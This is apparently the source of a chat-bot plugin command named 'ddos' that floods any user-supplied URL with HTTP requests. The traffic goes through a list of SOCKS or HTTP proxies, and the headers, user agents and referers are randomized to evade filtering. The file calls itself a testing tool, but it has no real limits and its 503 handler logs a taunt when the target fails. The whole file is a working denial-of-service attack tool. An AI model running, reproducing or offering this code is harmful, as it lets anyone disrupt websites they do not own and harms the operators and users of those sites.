const axios = require("axios");
const fs = require("fs");
const SocksProxyAgent = require("socks-proxy-agent");
const HttpsProxyAgent = require("https-proxy-agent");

module.exports["config"] = {
    name: "ddos",
    type: "tools",
    isPrefix: true,
    aliases: ["flood"],
    info: "Perform DDOS ATTACK on a target URL for testing purposes.",
    author: "Kenneth Panio",
    cd: 10,
    guide: "ddos http://example.com",
    usage: "[url]",
};

const {
    generateUserAgent
} = require('./system/useragent.js');


const langHeader = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en -gb;q=0.8, en;q=0.7",
    "cs;q=0.5",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-NZ,en;q=0.9",
    "en-ZA,en;q=0.9"
];

const refers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords="
];

const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384 :ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256 :ECDHE -RSA-AES128-SHA:E CDHE-ECDSA-AES128-S HA :ECDHE -RSA-AES256 -SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

const acceptHeader = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
];

const numThreads = 100;
const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

module.exports["run"] = async ({ args, chat, font }) => {
    const targetUrl = args[0];
    if (!targetUrl || (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://"))) {
        return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
    }

    const proxyFile = "../proxy.txt";

    const headers = {
        "Accept": acceptHeader[Math.floor(Math.random() * acceptHeader.length)],
        "Accept-Language": langHeader[Math.floor(Math.random() * langHeader.length)],
        "Cache-Control": randElement(cplist),
        "Referer": randElement(refers),
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "TE": "Trailers",
    };

    const proxies = (() => {
        try {
            return fs.readFileSync(proxyFile, "utf-8").split("\n").map((line) => line.trim());
        } catch {
            return [];
        }
    })();

    const start = await chat.reply(font.thin("Starting DDOS ATTACK..."));

    const sendRequest = (url, agent) => {
        headers["User-Agent"] = generateUserAgent();

        axios
            .get(url, { httpAgent: agent || null, headers })
            .then(() => console.log(`Request to ${url} succeeded.`))
            .catch((error) => {
            if (error.response && error.response.status === 503) {
                chat.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
            } else if (error.response && error.response.status === 502) {
                chat.log("Error: Request failed with status code 502");
            } else {
                chat.log("Error: " + error.message);
            }
        });
    };

    try {
        let requests = 0;
        for (let proxy of proxies) {
            const proxyParts = proxy.split(":");
            const agent =
                proxyParts[0].startsWith("socks")
                    ? new SocksProxyAgent(`socks5://${proxyParts[0]}:${proxyParts[1]}`)
                    : new HttpsProxyAgent(`http://${proxyParts[0]}:${proxyParts[1]}`);

            setInterval(() => {
                if (requests >= maxRequests) return; // Limit the number of requests for safety.
                sendRequest(targetUrl, agent);
                requests++;
            }, 1000 / requestsPerSecond);  // Request rate

            if (requests >= numThreads) break; // Stop after a specified number of threads
        }

        chat.reply(font.thin("DDOS Attack initiated."));
    } catch (error) {
        chat.reply(font.thin(`Error: ${error.message || "An error occurred."}`));
        start.unsend();
    }
};
